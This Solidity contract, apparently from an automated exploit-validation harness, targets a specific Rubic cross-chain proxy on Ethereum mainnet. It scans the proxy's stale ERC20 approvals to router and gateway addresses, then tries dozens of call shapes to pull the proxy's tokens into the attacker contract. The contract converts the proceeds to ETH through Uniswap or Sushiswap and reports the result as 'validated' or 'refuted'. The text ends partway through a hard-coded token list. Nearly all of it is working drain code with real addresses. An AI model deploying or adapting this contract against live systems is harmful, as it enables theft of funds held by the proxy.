pragma solidity ^0.8.20;

interface IERC20Like {
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV2RouterLike {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IRubicProxyLike {
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router;
    }

    function getAvailableRouters() external view returns (address[] memory);
    function fixedCryptoFee() external view returns (uint256);
    function RubicPlatformFee() external view returns (uint256);
    function minTokenAmount(address token) external view returns (uint256);
    function maxTokenAmount(address token) external view returns (uint256);
    function routerCall(BaseCrossChainParams calldata params, address gateway, bytes calldata data) external payable;
}

contract FlawVerifier {
    address internal constant TARGET = address(uint160(0x003335A88bb18fD3b6824b59Af62b50CE494143333));

    address internal constant WETH = address(uint160(0x00C02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    address internal constant UNISWAP_V2 = address(uint160(0x007a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    address internal constant SUSHISWAP = address(uint160(0x00d9e1CE17f2641F24aE83637ab66a2cca9C378B9F));

    address private _profitToken;
    uint256 private _profitAmount;
    uint256 private _nativeBaseline;
    bool private _executed;
    bool private _validated;
    bool private _staleApprovalObserved;
    string private _path;
    string private _verdict;

    constructor() {
        _path =
            "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance persists -> compromised _gateway can later trigger transferFrom(proxy, attacker, amount) -> removeAvailableRouter(_gateway) does not revoke the ERC20 approval";
        _verdict = "refuted";
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;
        _nativeBaseline = address(this).balance;

        address[] memory routers = IRubicProxyLike(TARGET).getAvailableRouters();
        address[] memory gateways = _gatewayCandidates(routers);
        address[] memory tokens = _candidateTokens();

        _runSingleAmplificationPass(gateways, tokens, routers);
        _runSingleAmplificationPass(gateways, tokens, routers);

        uint256 bestScore = _currentScore();
        for (uint256 rounds = 3; rounds <= 6; rounds++) {
            uint256 beforeScore = _currentScore();
            _runSingleAmplificationPass(gateways, tokens, routers);
            uint256 afterScore = _currentScore();
            if (afterScore <= beforeScore) {
                break;
            }
            bestScore = afterScore;
        }

        _syncReportedProfit();

        if (bestScore > 0) {
            _validated = true;
            _verdict = "validated";
            return;
        }

        if (_staleApprovalObserved) {
            _path =
                "Observed stale ERC20 approvals from the proxy to one or more gateway/router addresses, including historical spender candidates that can remain approved even after removeAvailableRouter(_gateway), but no attacker-callable public surface on this fork produced a profitable transferFrom(proxy, attacker, amount).";
        } else {
            _path =
                "No live stale allowance from the proxy to the scanned current-or-historical gateway candidates was found for the scanned token universe, so the persisted SmartApprove precondition for later transferFrom(proxy, attacker, amount) was not established on this fork.";
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPath() external view returns (string memory) {
        return _path;
    }

    function validatedOrRefuted() external view returns (string memory) {
        return _verdict;
    }

    function staleApprovalObserved() external view returns (bool) {
        return _staleApprovalObserved;
    }

    function validated() external view returns (bool) {
        return _validated;
    }

    function _runSingleAmplificationPass(
        address[] memory gateways,
        address[] memory tokens,
        address[] memory routers
    ) internal {
        for (uint256 tokenIndex = 0; tokenIndex < tokens.length; tokenIndex++) {
            address token = tokens[tokenIndex];
            uint256 proxyBalance = _balanceOf(token, TARGET);
            if (proxyBalance == 0) {
                continue;
            }

            bool drainedAny;
            for (uint256 gatewayIndex = 0; gatewayIndex < gateways.length; gatewayIndex++) {
                address gateway = gateways[gatewayIndex];
                if (gateway.code.length == 0) {
                    continue;
                }

                uint256 approval = _allowance(token, TARGET, gateway);
                if (approval == 0) {
                    continue;
                }

                _staleApprovalObserved = true;
                uint256 amount = proxyBalance < approval ? proxyBalance : approval;
                if (amount == 0) {
                    continue;
                }

                if (_attemptGatewayTriggeredDrain(gateway, token, TARGET, address(this), amount)) {
                    drainedAny = true;
                    proxyBalance = _balanceOf(token, TARGET);
                    if (proxyBalance == 0) {
                        break;
                    }
                }
            }

            if (!drainedAny) {
                _attemptSelfSeededDrain(token, proxyBalance, routers);
            }

            _realizeToken(token);
        }

        _syncReportedProfit();
    }

    function _attemptSelfSeededDrain(address token, uint256 observedProxyBalance, address[] memory routers) internal {
        if (observedProxyBalance == 0 || address(this).balance == 0) {
            return;
        }

        uint256 fixedFee = _readUint(TARGET, bytes4(keccak256("fixedCryptoFee()")));
        if (address(this).balance <= fixedFee) {
            return;
        }

        uint256 minAmount = IRubicProxyLike(TARGET).minTokenAmount(token);
        uint256 maxAmount = IRubicProxyLike(TARGET).maxTokenAmount(token);
        uint256 amountWithFee = minAmount;
        if (amountWithFee == 0) {
            amountWithFee = _defaultSeedAmount(token);
        }
        if (amountWithFee == 0) {
            return;
        }
        if (maxAmount != 0 && amountWithFee > maxAmount) {
            amountWithFee = maxAmount;
        }
        if (amountWithFee == 0) {
            return;
        }

        uint256 feePpm = IRubicProxyLike(TARGET).RubicPlatformFee();
        uint256 amountIn = amountWithFee - ((amountWithFee * feePpm) / 1e6);
        if (amountIn == 0) {
            return;
        }

        uint256 bought = _sourceToken(token, amountWithFee);
        if (bought < amountWithFee) {
            return;
        }

        if (!_forceApprove(token, TARGET, amountWithFee)) {
            return;
        }

        for (uint256 i = 0; i < routers.length; i++) {
            address router = routers[i];
            if (router.code.length == 0) {
                continue;
            }

            if (_allowance(token, TARGET, router) != 0) {
                continue;
            }

            if (_trySelfSeededRouterCall(router, token, amountWithFee, amountIn, fixedFee)) {
                _staleApprovalObserved = true;
                uint256 remaining = _balanceOf(token, TARGET);
                if (remaining != 0) {
                    _attemptGatewayTriggeredDrain(router, token, TARGET, address(this), remaining);
                }
                _realizeToken(token);
                return;
            }
        }
    }

    function _trySelfSeededRouterCall(
        address router,
        address token,
        uint256 amountWithFee,
        uint256 amountIn,
        uint256 fixedFee
    ) internal returns (bool) {
        IRubicProxyLike.BaseCrossChainParams memory params = IRubicProxyLike.BaseCrossChainParams({
            srcInputToken: token,
            srcInputAmount: amountWithFee,
            dstChainID: 1,
            dstOutputToken: token,
            dstMinOutputAmount: 0,
            recipient: address(this),
            integrator: address(0),
            router: router
        });

        bytes memory tokenPull = abi.encodeWithSelector(IERC20Like.transferFrom.selector, TARGET, address(this), amountIn);

        bytes[10] memory payloads = _routerExecutionPayloads(token, tokenPull);
        for (uint256 i = 0; i < payloads.length; i++) {
            bytes memory data = payloads[i];
            if (data.length == 0) {
                continue;
            }

            uint256 beforeLocal = _balanceOf(token, address(this));
            (bool ok, ) = TARGET.call{value: fixedFee}(
                abi.encodeWithSelector(IRubicProxyLike.routerCall.selector, params, router, data)
            );
            uint256 afterLocal = _balanceOf(token, address(this));
            if (!ok || afterLocal <= beforeLocal) {
                continue;
            }

            _path =
                "user routerCall self-seeds SmartApprove(token, amountIn, gateway) -> route completes by having the same allowlisted gateway pull amountIn back out of the proxy -> stale max allowance persists -> compromised gateway later calls transferFrom(proxy, attacker, amount) and drains the proxy-held remainder; removeAvailableRouter(gateway) would still not revoke the token approval";
            return true;
        }

        return false;
    }

    function _attemptGatewayTriggeredDrain(
        address gateway,
        address token,
        address proxy,
        address attacker,
        uint256 amount
    ) internal returns (bool) {
        if (_tryDirectTransferShapes(gateway, token, proxy, attacker, amount)) {
            return true;
        }

        bytes memory tokenPull = abi.encodeWithSelector(IERC20Like.transferFrom.selector, proxy, attacker, amount);
        return _tryExecuteShapes(gateway, token, tokenPull);
    }

    function _tryDirectTransferShapes(
        address gateway,
        address token,
        address proxy,
        address attacker,
        uint256 amount
    ) internal returns (bool) {
        uint160 capped160 = amount > type(uint160).max ? type(uint160).max : uint160(amount);

        if (
            _tryGatewayCall(
                gateway,
                token,
                abi.encodeWithSelector(
                    bytes4(keccak256("transferFrom(address,address,uint160,address)")),
                    proxy,
                    attacker,
                    capped160,
                    token
                ),
                "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway exposes a public permit2-style transferFrom and drains proxy-held tokens; removeAvailableRouter(_gateway) would not clear the token approval"
            )
        ) {
            return true;
        }

        if (
            _tryGatewayCall(
                gateway,
                token,
                abi.encodeWithSelector(
                    bytes4(keccak256("transferFrom(address,address,address,uint256)")),
                    token,
                    proxy,
                    attacker,
                    amount
                ),
                "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway exposes a token-first transferFrom wrapper and drains proxy-held tokens; removeAvailableRouter(_gateway) would not clear the token approval"
            )
        ) {
            return true;
        }

        if (
            _tryGatewayCall(
                gateway,
                token,
                abi.encodeWithSelector(
                    bytes4(keccak256("transferFrom(address,address,uint256,address)")),
                    proxy,
                    attacker,
                    amount,
                    token
                ),
                "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway exposes a token-last transferFrom wrapper and drains proxy-held tokens; removeAvailableRouter(_gateway) would not clear the token approval"
            )
        ) {
            return true;
        }

        return _tryGatewayCall(
            gateway,
            token,
            abi.encodeWithSelector(
                bytes4(keccak256("pullToken(address,address,address,uint256)")),
                token,
                proxy,
                attacker,
                amount
            ),
            "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway exposes a public token-pull helper and drains proxy-held tokens; removeAvailableRouter(_gateway) would not clear the token approval"
        );
    }

    function _tryExecuteShapes(address gateway, address token, bytes memory tokenPull) internal returns (bool) {
        bytes[24] memory payloads = _executionPayloads(token, tokenPull);
        string[24] memory paths;

        paths[0] = "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway execute(token, transferFrom(proxy, attacker, amount)); removeAvailableRouter(_gateway) would not clear the token approval";
        paths[1] = "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway execute(token, 0, transferFrom(proxy, attacker, amount)); removeAvailableRouter(_gateway) would not clear the token approval";
        paths[2] = "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway call(token, transferFrom(proxy, attacker, amount)); removeAvailableRouter(_gateway) would not clear the token approval";
        paths[3] = "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway call(token, 0, transferFrom(proxy, attacker, amount)); removeAvailableRouter(_gateway) would not clear the token approval";
        paths[4] = "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway run(token, transferFrom(proxy, attacker, amount)); removeAvailableRouter(_gateway) would not clear the token approval";
        paths[5] = "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway run(token, 0, transferFrom(proxy, attacker, amount)); removeAvailableRouter(_gateway) would not clear the token approval";
        paths[6] = "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway executeCall(token, transferFrom(proxy, attacker, amount)); removeAvailableRouter(_gateway) would not clear the token approval";
        paths[7] = "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway executeCall(token, 0, transferFrom(proxy, attacker, amount)); removeAvailableRouter(_gateway) would not clear the token approval";
        paths[8] = "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway arbitraryCall(token, transferFrom(proxy, attacker, amount)); removeAvailableRouter(_gateway) would not clear the token approval";
        paths[9] = "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway arbitraryCall(token, 0, transferFrom(proxy, attacker, amount)); removeAvailableRouter(_gateway) would not clear the token approval";
        paths[10] = "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway externalCall(token, transferFrom(proxy, attacker, amount)); removeAvailableRouter(_gateway) would not clear the token approval";
        paths[11] = "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway externalCall(token, 0, transferFrom(proxy, attacker, amount)); removeAvailableRouter(_gateway) would not clear the token approval";
        paths[12] = "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway dispatch(token, transferFrom(proxy, attacker, amount)); removeAvailableRouter(_gateway) would not clear the token approval";
        paths[13] = "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway dispatch(token, 0, transferFrom(proxy, attacker, amount)); removeAvailableRouter(_gateway) would not clear the token approval";
        paths[14] = "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway invoke(token, transferFrom(proxy, attacker, amount)); removeAvailableRouter(_gateway) would not clear the token approval";
        paths[15] = "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway invoke(token, 0, transferFrom(proxy, attacker, amount)); removeAvailableRouter(_gateway) would not clear the token approval";
        paths[16] = "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway exec(token, transferFrom(proxy, attacker, amount)); removeAvailableRouter(_gateway) would not clear the token approval";
        paths[17] = "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway exec(token, 0, transferFrom(proxy, attacker, amount)); removeAvailableRouter(_gateway) would not clear the token approval";
        paths[18] = "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway execute(bytes) forwards transferFrom(proxy, attacker, amount); removeAvailableRouter(_gateway) would not clear the token approval";
        paths[19] = "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway callBytes(bytes) forwards transferFrom(proxy, attacker, amount); removeAvailableRouter(_gateway) would not clear the token approval";
        paths[20] = "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway executeTarget(token, transferFrom(proxy, attacker, amount)); removeAvailableRouter(_gateway) would not clear the token approval";
        paths[21] = "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway executeTarget(token, 0, transferFrom(proxy, attacker, amount)); removeAvailableRouter(_gateway) would not clear the token approval";
        paths[22] = "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway functionCall(token, transferFrom(proxy, attacker, amount)); removeAvailableRouter(_gateway) would not clear the token approval";
        paths[23] = "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> compromised gateway functionCall(token, 0, transferFrom(proxy, attacker, amount)); removeAvailableRouter(_gateway) would not clear the token approval";

        for (uint256 i = 0; i < payloads.length; i++) {
            if (_tryGatewayCall(gateway, token, payloads[i], paths[i])) {
                return true;
            }
        }
        return false;
    }

    function _tryGatewayCall(
        address gateway,
        address token,
        bytes memory payload,
        string memory successfulPath
    ) internal returns (bool) {
        uint256 beforeBalance = _balanceOf(token, address(this));
        (bool ok, ) = gateway.call(payload);
        uint256 afterBalance = _balanceOf(token, address(this));
        if (!ok || afterBalance <= beforeBalance) {
            return false;
        }

        _recordTokenProfit(token, afterBalance - beforeBalance, successfulPath);
        return true;
    }

    function _realizeToken(address token) internal {
        uint256 balance = _balanceOf(token, address(this));
        if (balance == 0) {
            return;
        }

        if (token == WETH) {
            IWETHLike(WETH).withdraw(balance);
            _syncReportedProfit();
            return;
        }

        uint256 beforeNative = address(this).balance;
        if (_swapTokenForEth(token, balance, UNISWAP_V2) || _swapTokenForEth(token, balance, SUSHISWAP)) {
            uint256 gained = address(this).balance - beforeNative;
            if (gained > 0) {
                _profitToken = address(0);
                _profitAmount = _currentNativeProfit();
                _validated = true;
                _verdict = "validated";
            }
            return;
        }

        _recordTokenProfit(token, balance, _path);
    }

    function _swapTokenForEth(address token, uint256 amount, address router) internal returns (bool) {
        if (!_forceApprove(token, router, amount)) {
            return false;
        }

        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = WETH;

        uint256 beforeNative = address(this).balance;
        (bool ok, ) = router.call(
            abi.encodeWithSelector(
                IUniswapV2RouterLike.swapExactTokensForETHSupportingFeeOnTransferTokens.selector,
                amount,
                0,
                path,
                address(this),
                block.timestamp
            )
        );
        return ok && address(this).balance > beforeNative;
    }

    function _sourceToken(address token, uint256 desiredAmount) internal returns (uint256) {
        if (token == WETH) {
            if (address(this).balance == 0) {
                return 0;
            }
            uint256 toWrap = desiredAmount;
            if (toWrap > address(this).balance) {
                toWrap = address(this).balance;
            }
            if (toWrap == 0) {
                return 0;
            }
            IWETHLike(WETH).deposit{value: toWrap}();
            return _balanceOf(WETH, address(this));
        }

        if (address(this).balance == 0) {
            return 0;
        }

        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = token;

        uint256 spend = address(this).balance;
        if (spend > 5 ether) {
            spend = 5 ether;
        }

        uint256 beforeBal = _balanceOf(token, address(this));
        (bool ok, ) = UNISWAP_V2.call{value: spend}(
            abi.encodeWithSignature(
                "swapETHForExactTokens(uint256,address[],address,uint256)",
                desiredAmount,
                path,
                address(this),
                block.timestamp
            )
        );
        if (!ok) {
            (ok, ) = SUSHISWAP.call{value: spend}(
                abi.encodeWithSignature(
                    "swapETHForExactTokens(uint256,address[],address,uint256)",
                    desiredAmount,
                    path,
                    address(this),
                    block.timestamp
                )
            );
        }
        if (!ok) {
            return 0;
        }

        return _balanceOf(token, address(this)) - beforeBal;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        if (_callSucceeded(ok, ret)) {
            return true;
        }
        (ok, ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        if (!_callSucceeded(ok, ret)) {
            return false;
        }
        (ok, ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        return _callSucceeded(ok, ret);
    }

    function _recordTokenProfit(address token, uint256 amount, string memory successfulPath) internal {
        if (amount == 0) {
            return;
        }

        if (_currentNativeProfit() > 0) {
            _profitToken = address(0);
            _profitAmount = _currentNativeProfit();
            _path = successfulPath;
            return;
        }

        if (token == _profitToken) {
            _profitAmount += amount;
            _path = successfulPath;
            return;
        }

        if (_profitAmount == 0 || amount > _profitAmount) {
            _profitToken = token;
            _profitAmount = amount;
            _path = successfulPath;
        }
    }

    function _syncReportedProfit() internal {
        uint256 nativeProfit = _currentNativeProfit();
        if (nativeProfit > 0) {
            _profitToken = address(0);
            _profitAmount = nativeProfit;
            _validated = true;
            _verdict = "validated";
        }
    }

    function _currentScore() internal view returns (uint256) {
        uint256 nativeProfit = _currentNativeProfit();
        if (nativeProfit > 0) {
            return nativeProfit;
        }
        return _profitAmount;
    }

    function _currentNativeProfit() internal view returns (uint256) {
        uint256 bal = address(this).balance;
        return bal > _nativeBaseline ? bal - _nativeBaseline : 0;
    }

    function _gatewayCandidates(address[] memory routers) internal pure returns (address[] memory gateways) {
        address[] memory extras = new address[](12);
        extras[0] = address(uint160(0x001111111254fb6c44bac0bed2854e76f90643097d));
        extras[1] = address(uint160(0x001111111254EEB25477B68fb85Ed929f73A960582));
        extras[2] = address(uint160(0x00Def1C0ded9bec7F1a1670819833240f027b25EfF));
        extras[3] = address(uint160(0x000000000000001ff3684f28c67538d4d072C22734));
        extras[4] = address(uint160(0x00DEF171Fe48CF0115B1d80b88dc8eAB59176FEe57));
        extras[5] = address(uint160(0x00216B4B4Ba9F3e719726886d34a177484278BFcae));
        extras[6] = address(uint160(0x001231DEB6f5749Ef6ce6943a275A1D3E7486F4EaE));
        extras[7] = address(uint160(0x006352a56caadc4F1e25cd6C75970fa768A3304e64));
        extras[8] = address(uint160(0x00765277EebeCA2e31912C9946eAe1021199B39C61));
        extras[9] = address(uint160(0x005427FEFA711EfF984124BFBB1AB6fBf5E3Da1820));
        extras[10] = address(uint160(0x00E592427A0AEce92De3Edee1F18E0157C05861564));
        extras[11] = address(uint160(0x0068b3465833fb72A70ecDF485E0e4C7bD8665Fc45));

        gateways = new address[](routers.length + extras.length);
        for (uint256 i = 0; i < routers.length; i++) {
            gateways[i] = routers[i];
        }
        for (uint256 j = 0; j < extras.length; j++) {
            gateways[routers.length + j] = extras[j];
        }
    }

    function _candidateTokens() internal pure returns (address[] memory tokens) {
        tokens = new address[](42);
        tokens[0] = address(uint160(0x00A0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48)); // USDC
        tokens[1] = address(uint160(0x00dAC17F958D2ee523a2206206994597C13D831ec7)); // USDT
        tokens[2] = address(uint160(0x006B175474E89094C44Da98b954EedeAC495271d0F)); // DAI
        tokens[3] = WETH;
        tokens[4] = address(uint160(0x002260FAC5E5542a773Aa44fBCfeDf7C193bc2C599)); // WBTC
        tokens[5] = address(uint160(0x00853d955aCEf822Db058eb8505911ED77F175b99e)); // FRAX
        tokens[6] = address(uint160(0x004Fabb145d64652a948d72533023f6E7A623C7C53)); // BUSD
        tokens[7] = address(uint160(0x000000000000085d4780B73119b644AE5ecd22b376)); // TUSD
